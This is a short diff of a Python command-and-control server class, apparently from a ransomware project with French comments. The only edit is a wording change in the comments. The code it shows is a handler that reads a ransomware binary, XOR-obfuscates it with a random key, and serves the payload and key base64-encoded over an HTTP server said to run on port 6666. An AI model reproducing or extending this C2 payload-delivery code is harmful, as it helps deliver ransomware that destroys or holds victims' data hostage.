@@ -73,13 +73,13 @@ class CNC(CNCBase):
         return {"status": "OK"}
     
     def get_ransomware(self, path: str, params: dict, body: dict) -> dict:
-        # Fonction pour récupérer le ransomware crypté avec une clé XOR aléatoire
+        # Fonction pour récupérer le ransomware chiffré avec une clé XOR aléatoire
         with open(os.path.join(self.RANSOMWARE_PATH, "ransomware"), "rb") as f:
             # Génère une clé aléatoire pour l'obfuscation
             key = os.urandom(32)
             # Crypte le fichier avec la clé XOR aléatoire
             file = xor_crypt(f.read(), key)
-            # Renvoie le fichier crypté et la clé XOR sous forme de chaînes Base64
+            # Renvoie le fichier chiffré et la clé XOR sous forme de chaînes Base64
             return {"status": "OK", "data": base64.b64encode(file).decode(), "key": base64.b64encode(key).decode()}
 
 # Crée et démarre le serveur HTTP sur le port 6666
